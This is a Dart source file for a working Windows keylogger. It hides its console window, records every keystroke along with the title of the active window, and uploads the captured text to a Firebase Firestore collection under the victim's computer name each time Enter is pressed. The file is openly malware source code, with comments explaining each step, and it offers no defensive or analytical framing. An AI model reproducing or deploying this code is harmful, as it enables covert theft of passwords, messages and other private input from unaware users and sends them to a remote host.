import 'package:firedart/firedart.dart';
import 'package:keylogger/app/data/sysinfo.dart';
import 'package:win32/win32.dart';

///import the sysifno to call the function to get the name of current user 

import 'app/data/globel.dart';

void main() async {
  ///initialize the firebase
  Firestore.initialize(projectId);

  ///this function to hide the console window when start the program
  ShowWindow(GetConsoleWindow(), SW_HIDE);

  ///get the collection from firebase
  CollectionReference collection = Firestore.instance.collection('keylogger');

  ///check if the user is exesting or not in  collection by the name of the computer
  DocumentReference document = collection.document(getComputerName());

  ///if the user is not exesting create a new one with the name of the computer
  if (await document.exists == false) {
    await document.create({'name': getComputerName()});
  } else {
    ///if the user is exesting update the last time he was online
    final kelogger = await document.get();
    keys.add(kelogger['keylogger']);
    print(keys);
  }

  while (true) {
    ///sleep the program for 1 second to reduce the cpu usage and the ram usage
    Sleep(10);

    ///if muse  pressed i must get the active window title and the time and save it in the list without repeating the same window title
    if (GetAsyncKeyState(VK_LBUTTON) == -32767) {
      if (activeWindow != getActiveWindowTitle()) {
        activeWindow = getActiveWindowTitle();
        keys.add("[$activeWindow] ");
        print(activeWindow);
      }
    }

    ///initialize the variable to get the key pressed
    for (int KEY = 8; KEY <= 190; KEY++) {
      ///if any key's pressed that will change the value of the variable to -32767 so i must check if the key is pressed or not with this condition
      if (GetAsyncKeyState(KEY) == -32767) {
        ///if the key is caps lock then i will add the key to the list with upper case
        if (GetKeyState(VK_CAPITAL) == 1) {
          if (specialKeys(KEY) == false) {
            addKeyToList(String.fromCharCode(KEY));
          } else {
            addKeyToList(char);
          }
        } else {
          ///if the key is not caps
          if (specialKeys(KEY) == false) {
            addKeyToList(String.fromCharCode(KEY).toLowerCase());
          } else {
            addKeyToList(char.toLowerCase());
          }
        }

        ///if pressed key is enter i will update the list in the firebase
        if (KEY == VK_RETURN) {
          await collection.document(getComputerName()).set({
            'keylogger': keys.join().toLowerCase(),
            'time': getTime(),
          });
        }
      }
    }
  }
}
